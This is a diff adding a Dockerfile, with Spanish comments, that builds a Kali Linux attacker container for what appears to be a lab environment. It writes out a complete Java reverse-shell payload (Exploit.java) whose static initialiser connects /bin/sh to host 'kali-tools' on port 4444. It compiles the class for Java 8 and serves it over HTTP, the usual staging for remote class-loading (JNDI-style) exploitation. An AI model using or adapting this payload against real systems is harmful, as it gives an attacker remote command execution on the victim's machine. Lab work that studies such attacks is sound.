@@ -1,0 +1,54 @@
+FROM kalilinux/kali-rolling
+
+RUN apt-get update && apt-get install -y \
+    netcat-traditional \
+    curl \
+    python3 \
+    default-jdk \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /tmp
+
+# Código optimizado sin bloqueos de resolución DNS interna
+RUN cat << 'EOF' > Exploit.java
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Exploit {
+    static {
+        try {
+            // Usamos el nombre directo del contenedor del atacante
+            String host = "kali-tools"; 
+            int port = 4444;
+            String[] cmd = {"/bin/sh"};
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while (!s.isClosed()) {
+                while (pi.available() > 0) so.write(pi.read());
+                while (pe.available() > 0) so.write(pe.read());
+                while (si.available() > 0) po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+EOF
+
+# Forzamos al compilador moderno de Kali a generar bytecode compatible con Java 8
+RUN javac --release 8 Exploit.java
+
+EXPOSE 8000
+CMD ["python3", "-m", "http.server", "8000", "--directory", "/tmp"]
